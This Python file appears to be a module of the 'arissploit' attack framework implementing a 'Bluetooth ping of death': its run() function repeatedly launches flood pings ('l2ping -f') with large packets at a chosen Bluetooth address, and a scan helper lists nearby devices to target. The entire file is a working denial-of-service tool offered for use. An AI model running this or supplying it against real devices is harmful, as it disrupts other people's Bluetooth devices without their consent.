from core.arissploit import *
import os
import subprocess
import time

conf = {
	"name": "bluetooth_pod",
	"version": "1.0",
	"shortdesc": "Bluetooth ping of death.",
	"author": "Entynetproject",
	"initdate": "24.2.2016",
	"lastmod": "29.12.2016",
	"apisupport": False,
	"needroot": 1,
	"dependencies": ["xterm", "hcitool", "l2ping"]

}


# List of variables
variables = OrderedDict((
	('interface', ['hci0', 'Interface.']),
	('bdaddr', ['none', 'Target bluetooth address.']),
	('size', ['600', 'Size of packets (default 600).']),
))

# Custom commands
customcommands = {
	'scan': 'Scan for devices.'
}

# Simple changelog
changelog = "Version 1.0:\nrelease"

def run():
	printInfo("Bluetooth ping of death attack started...")
	try:
		for i in range(1, 10000):
			xterm_1 = "l2ping -i %s -s %s -f %s &" % (variables['interface'][0], variables['size'][0], variables['bdaddr'][0])
			subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
			time.sleep(3)
	except(OSError):
		printError("Something went wrong!")


def scan(args):
	os.system("hcitool scan")
